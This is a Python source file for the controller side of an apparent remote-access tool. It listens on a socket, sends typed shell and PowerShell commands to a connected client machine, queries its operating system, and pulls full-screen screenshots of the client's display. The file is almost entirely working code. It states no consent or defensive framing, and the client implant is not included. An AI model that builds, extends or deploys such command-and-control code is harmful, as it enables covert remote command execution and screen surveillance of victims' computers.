import socket
import subprocess
import platform
import os
import select
import atexit
import threading

class Server:
    def __init__(self, ip, port):
        self.IP = ip
        self.PORT = port
        self.controling = False
        self.sock = None

        atexit.register(self.cleanup)

        self.bind()
    
    def bind(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.IP, self.PORT))
            self.sock.listen(1)
            print(f"Listening at {self.IP}:{self.PORT}.")
            self.accept()
        except KeyboardInterrupt:
            self.cleanup()

    def accept(self):
        self.conn = None
        try:
            self.conn, self.addr = self.sock.accept()
            self.conn.send(str("name").encode())
            data = self.conn.recv(1024).decode(errors='ignore') 
            print(f"Let's welcome '{data}'")
            self.controling = True
            self.accessing()
        except KeyboardInterrupt:
            self.cleanup()

    def accessing(self):
        try:
            while self.controling:
                userInput = input("$: ").lower()
                self.conn.send(userInput.encode())
                
                if userInput == "exit":
                    self.cleanup()
                elif userInput == "screenshot":
                    self.receive_screenshot()
                elif userInput == "getos":
                    max_seconds = 2
                    ready = select.select([self.conn], [], [], max_seconds)
                    
                    if ready[0]:
                        data = self.conn.recv(1024).decode()
                        print(f"Client OS: {data}")
                    else:
                        print("Command response timeout. Returning to prompt.")
                        return self.accessing()
                elif userInput == "clear":
                    for i in range(10):
                        threading.Thread(target=self.clearTerminal).start()

                elif userInput == "help":
                    print("\n-- Help --\n")
                    print("exit -> send message to client to exit and then close the socket.")
                    print("screenshot -> take a full screen screenshot of the clients screen")
                    print("getos -> get the clients operating system")
                    print("none -> execute a terminal command")
                    print("clear -> clear the terminal window")
                    print("")
                    print("you can type 'powershell' before your comman to execute a powershell command (if window of course)\n")
                else:
                    max_seconds = 2
                    ready = select.select([self.conn], [], [], max_seconds)
                    
                    if ready[0]:
                        data = self.conn.recv(1024).decode()
                        print(data)
                    else:
                        print("Command response timeout. Returning to prompt.")
                        return self.accessing()

        except KeyboardInterrupt:
            self.cleanup()

    def clearTerminal(self):
        for i in range(999):
            print("\n")  
        print("Cleared terminal.\n")  

    def receive_screenshot(self):
        try:
            file_size = int.from_bytes(self.conn.recv(4), 'big')
            screenshot_filename = "received_screenshot.png"
            received_size = 0
            screenshot_data = b""

            max_seconds = 5

            if not os.path.exists(screenshot_filename):
                open(screenshot_filename, "x").close()

            while received_size < file_size:
                ready = select.select([self.conn], [], [], max_seconds)
                if ready[0]:
                    packet = self.conn.recv(min(1024, file_size - received_size))
                    if not packet:
                        break
                    screenshot_data += packet
                    received_size += len(packet)
                else:
                    print("Failed to get screenshot: Timeout exceeded.")
                    return self.accessing()

            with open(screenshot_filename, "wb") as f:
                f.write(screenshot_data)

            print(f"Screenshot received and saved as '{screenshot_filename}'.")

            try:
                current_os = platform.system()
                if current_os == "Darwin":  
                    subprocess.Popen(["open", screenshot_filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif current_os == "Linux":  
                    subprocess.Popen(["xdg-open", screenshot_filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif current_os == "Windows":  
                    os.startfile(screenshot_filename)
                else:
                    print(f"Unsupported OS: {current_os}. Cannot open the image.")
            except Exception as e:
                print(f"Failed to open image: {str(e)}")

            return self.accessing()

        except Exception as e:
            print(f"Failed to receive screenshot: {str(e)}")
            return self.accessing()

    def cleanup(self):
        self.controling = False

        if self.conn:
            self.conn.send("exit".encode())
        if self.sock:
            self.sock.close()

        print("\nSocket closed.")

IP = "127.0.0.1"
PORT = 12364

Server(IP, PORT)
